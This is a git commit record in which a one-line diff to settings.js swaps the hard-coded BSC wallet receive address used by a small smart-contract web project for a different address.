bd251c81e87e3b0f9fdc85a47c1a74b4d760e761
preyeispyrce <therestay7@gmail.com>
2024-05-16 09:14:22 -0600

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xa418adC64aa1D5973AE5B896FA961953162eb29D";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
